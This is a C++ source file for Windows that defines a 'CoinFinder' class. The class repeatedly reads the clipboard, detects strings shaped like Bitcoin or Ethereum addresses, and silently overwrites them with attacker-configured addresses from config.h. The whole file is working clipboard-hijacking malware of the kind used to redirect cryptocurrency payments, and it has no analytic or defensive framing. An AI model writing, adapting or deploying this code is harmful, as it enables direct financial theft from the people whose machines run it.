#include <iostream>
#include <string>
#include <Windows.h> // use < > for all system and library headers
#include <time.h>
#include "config.h"
class CoinFinder
{
public:
	void grabBitcoin() {
		try {
			Config config;
			std::string s = config.BitcoinAddress;
			while (true)
			{
				std::string clipboardText = this->GetClipboardText();
				if (clipboardText.length() >= 26 && clipboardText.length() <= 35 && clipboardText != s) {
					if (clipboardText.rfind("1", 0) == 0 || clipboardText.rfind("3", 0) == 0) {
						// clipboardText starts with prefix
						std::cout << "Found Bitcoin Address in memory";
						this->toClipboard(s);
					}
				}
				Sleep(1500);
			}
		}
		catch (int e){}
	}

	void grabEthereum() {
		try {
			Config config;
			std::string s = config.EthereumAddress;
			while (true)
			{
				std::string clipboardText = this->GetClipboardText();
				if (clipboardText.length() == 42 && clipboardText != s) {
					if (clipboardText.rfind("0x", 0) == 0) {
						// clipboardText starts with prefix
						std::cout << "Found Ethereum Address in memory";
						this->toClipboard(s);
					}
				}
				Sleep(1500);
			}
		}
		catch (int e) {}
	}

	std::string GetClipboardText()
	{
		// Try opening the clipboard
		if (!OpenClipboard(nullptr)){
			return "";
		}

		// Get handle of clipboard object for ANSI text
		HANDLE hData = GetClipboardData(CF_TEXT);
		if (hData == nullptr) {
			return "";
		}

		// Lock the handle to get the actual text pointer
		char* pszText = static_cast<char*>(GlobalLock(hData));
		if (pszText == nullptr) {
			return "";
		}
		// Save text in a string class instance
		std::string text(pszText);
		// Release the lock
		GlobalUnlock(hData);
		// Release the clipboard
		CloseClipboard();

		return text;
	}

	void toClipboard(std::string s) {
		HWND hwnd = GetDesktopWindow();
		OpenClipboard(hwnd);
		EmptyClipboard();
		HGLOBAL hg = GlobalAlloc(GMEM_MOVEABLE, s.size() + 1);
		if (!hg) {
			CloseClipboard();
			return;
		}
		memcpy(GlobalLock(hg), s.c_str(), s.size() + 1);
		GlobalUnlock(hg);
		SetClipboardData(CF_TEXT, hg);
		CloseClipboard();
		GlobalFree(hg);
	}

};
